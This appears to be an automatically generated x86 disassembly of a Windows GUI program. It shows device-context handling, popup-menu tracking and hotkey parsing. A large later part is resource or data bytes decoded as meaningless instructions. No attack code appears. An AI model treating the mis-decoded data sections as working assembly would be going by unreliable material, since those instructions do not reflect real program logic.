mov eax [ ebp - 0x14 ]
call sub_41d800
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d67c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_452dc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452938
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d800
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_4521d8
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_4518d8
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_4518d8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_452a91
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_452a6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_452a4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41d800
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d67c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452a56
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d800
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43b25c
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e990
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_4518d8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_4518d8
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_4518d8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_451908
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_451908
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45e634
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45e69c
jmp r-xdata
sub_452a73
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_452b2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413918
pop esi
pop ebx
retn
push ebx
push sub_45259c
call sub_41a578
mov [ ebx + 0x10 ] eax
sub_452b70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4516f0
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_452b2c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_452be4
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_452b54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45178c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_452c3c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44da88
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_4523f8
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4523f8
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_452c84
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44da88
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d1e0
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_40348c
mov edx eax
jmp r-xdata
sub_452cd0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412618
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_452c3c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_451044
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_451540
mov eax [ ebx + 0x34 ]
call sub_44e8e8
mov eax ebx
call sub_451ee8
mov eax ebx
call sub_452c84
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_44ea18
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_452d84
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413a74
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413a74
cmp ebp [ eax ]
jne r-xdata
sub_452dc0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41cf14
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41c728
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41cf14
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41c728
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_40348c
mov edx [ r-xdata ]
call sub_40341c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41cf14
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41c728
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_452ea8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404034
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4042a0
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404540
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4042a0
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404540
jmp r-xdata
sub_452f3c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403fe0
mov ebx 0x1
mov eax esi
call sub_4042a0
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4041c8
sub_452fa0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_452ff9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_452ea8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_452ea8
mov eax [ ebp - 0x8 ]
pop edx
call sub_407de0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453000
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
sub_453008
adc al [ eax ]
add [ eax ] al
mov eax 0x5400472c
das
inc edi
add [ esp + ebp + 0x2f040047 ] dh
inc edi
add [ eax - 0x4fffb8d4 ] dh
inc edi
add [ esp + ebp + 0x2ee00047 ] ch
inc edi
add [ eax - 0x2fffb8d4 ] ch
xor [ edi ] eax
movsb [ edi ] [ esi ]
sub al 0x47
add al ch
inc edi
add [ eax + 0x6c00472c ] ah
xor [ edi ] al
pushfd
sub al 0x47
add ah ah
das
inc edi
add [ eax + 0x5800472c ] bl
xor al [ edi ]
xchg esp eax
sub al 0x47
add [ edx + esi + 0x47 ] dl
add [ eax - 0x63ffb8d4 ] dl
das
inc edi
add [ esp + ebp + 0x32100047 ] cl
inc edi
add [ eax - 0x27ffb8d4 ] cl
xor [ edi ] eax
test [ edi + eax * 2 ] ch
add [ eax - 0x7fffb8ce ] ah
sub al 0x47
add [ edx + esi + 0x47 ] dh
add [ esp + ebp + 0x47 ] bh
add [ edi + ebp + 0x2c780047 ] ch
inc edi
add al al
das
inc edi
add [ esp + ebp + 0x47 ] dh
add ah bh
das
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_453100
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453107
retn
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a68
mov eax rw-data
call sub_403fe0
sub_45310c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_453008
call sub_403d8c
mov eax [ r-xdata ]
call sub_4132b0
mov eax [ r-xdata ]
call sub_413350
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
mov eax [ r-xdata ]
call sub_4131f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423c44
mov [ rw-data ] eax
sub_4531f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al [ fs : ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
xor al [ ebp ]
dec eax
add [ eax ] al
add [ eax + ebx ] bl
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edi ] al
xor [ ebp ] eax
or [ eax ] al
add bh bh
or [ eax ] al
add bh bh
and [ ebp + 0x45 ] dl
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
shl [ edx + esi + 0x45 ] 0x0
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
call eax
pop ebp
inc ebp
add ah ah
pop ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
xor al [ ebp ]
nop
sbb [ ecx ] al
or eax 0x6f460500
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
inc [ ebp + ebx * 2 + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
mov [ ebp + 0x45 ] bl
add [ ecx ] al
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
[ eax + 0x5c ]
pop es
xor al [ fs : ebp ]
jae r-xdata
jae r-xdata
xor al [ eax ]
inc esp
xor al [ eax ]
add al 0x40
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ecx + eax * 2 ] bl
inc ecx
add [ eax ] ch
push ebp
inc ebp
add [ ecx ] dl
xor al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
or [ ebp + eax * 2 ] bl
pop esp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41aa90
sub [ eax ] al
add bh bh
dec esp
pop esp
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
outsd
insb
outsd
jb r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
sbb [ ebp + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
jmp [ eax + 0x100455d ]
add [ eax ] al
je r-xdata
dec [ eax + 0x100455d ]
outsd
sub_4534a1
xor eax 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x35
inc ebp
add dh dl
xor eax 0x21c0045
add [ eax ] al
fcomp [ esi - 0x6463ffbd ]
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xchg esp eax
pushad
inc ebp
add [ eax - 0x57ffbbac ] al
sbb al 0x44
add [ eax ] dh
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax ] bl
inc ebp
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax + 0x61 ] al
inc ebp
add al dh
arpl [ ebp ] ax
and al 0x66
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
[ eax ]
add [ ebx + 0x497c0044 ] al
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add [ edi + 0x45 ] cl
add [ eax ] ah
popad
inc ebp
add [ eax ] cl
push ds
inc esp
add al dl
pushad
inc ebp
add al dh
sbb al [ eax + eax - 0x20 ]
pushad
inc ebp
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
sub_453dbc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x3f
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc ebp
add al bh
add al [ eax ]
add [ edx + edi - 0x6463ffbb ] dh
inc ecx
add al bl
imul eax [ ebp ] r-xdata
in al dx
xor al 0x40
add al bh
pop [ ebp ]
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add ah dh
imul eax [ ebp ] 0xffffff80
push esp
inc esp
add [ ecx + esi * 2 + 0x45 ] ah
add [ eax ] dh
inc eax
inc ecx
add [ ebp + ebp * 2 + 0x6df00045 ] dh
inc ebp
add ah bh
outsb
inc ebp
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 + 0x77740041 ] dh
inc ebp
add [ eax + ebx * 4 - 0x4cebffbf ] dl
inc ebp
add [ eax + ebp * 2 + 0x45 ] cl
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ esp + esi * 2 + 0x45 ] dl
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ eax + 0x75 ] cl
inc ebp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x3c0043e0 ] ch
ja r-xdata
add al 0x1d
add [ eax ] cl
jbe r-xdata
outsd
add [ 0x726f4654 ] al
insd
mov eax eax
add al 0x3f
inc ebp
jl r-xdata
add al ah
loope r-xdata
pop [ ebx ]
popad
add [ eax ] al
jmp [ eax + 0x3c0043d4 ]
outsd
insb
in al 0x87
inc ebx
add [ ebx ] bl
add bh bh
pushad
salc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
push [ eax - 0x4c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
outsb
mov [ edx + 0x2200043 ] fs
add bh bh
pop esp
nop
inc ebp
add ah bl
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d000e ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
outsb
je r-xdata
add ah cl
and eax 0x3c0041
add dh bh
rcl ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
add [ edi ] al
add eax 0x726f4654
insd
add al 0x3e
inc ebp
add [ ebp + edi + 0x5e0045 ] dl
add eax 0x6d726f46
jae r-xdata
add [ eax + 0x70004596 ] ch
pop ebx
inc esp
add al bh
inc ebp
inc esp
add [ ebx + ebp * 4 + 0x61400045 ] bh
inc ebp
add al dh
arpl [ ebp ] ax
pushfd
pushfd
inc ebp
add al bl
insb
inc ebp
add [ ebp + ebp * 2 + 0x45 ] dl
add [ edi + ebp * 4 + 0x6a100045 ] bl
inc ebp
add [ eax - 0x7fffba56 ] ah
xchg ecx eax
inc ebp
add [ esp + ebp * 4 + 0x45 ] dl
add [ eax ] bh
ja r-xdata
inc esp
inc esp
add [ ecx + ecx * 2 + 0x44 ] bh
add [ edi + esi * 2 + 0x4bc0045 ] dh
inc esp
add [ edi + eax * 2 + 0x48580044 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add [ edi + 0x45 ] cl
add [ eax + 0x7e ] bl
inc ebp
add [ eax ] cl
push ds
inc esp
add [ ebx + ecx * 4 ] bl
inc ebp
add [ esi + ecx * 4 + 0x45 ] bh
add [ eax ] bh
lea eax [ ebp ]
mov al [ 0xffffffffa400441e ]
push ds
inc esp
add [ edi + ecx * 4 + 0x1d040045 ] dh
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsd
outsb
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebp + eax * 2 + 0x100 ] dh
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
jo r-xdata
inc ebp
add [ ecx ] ch
add al [ eax ]
call [ eax ]
add [ ebp ] 0xdc
add [ ebp ] 0x0
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
outsd
or al 0x8f
inc ebx
add [ ecx ] ah
add bh bh
mov al [ 0x3c0043d4 ]
aad 0x43
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
call 0xffffffffad44416e
mov ah 0x45
imul ebp [ edi + 0x6e ] r-xdata
xchg esp eax
fild [ ebx ]
pushad
jbe r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
xor [ esi + 0x45 ] dh
insb
test [ gs : ebp + 0x16c0043 ] bl
add bh bh
mov [ edx + 0x44 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
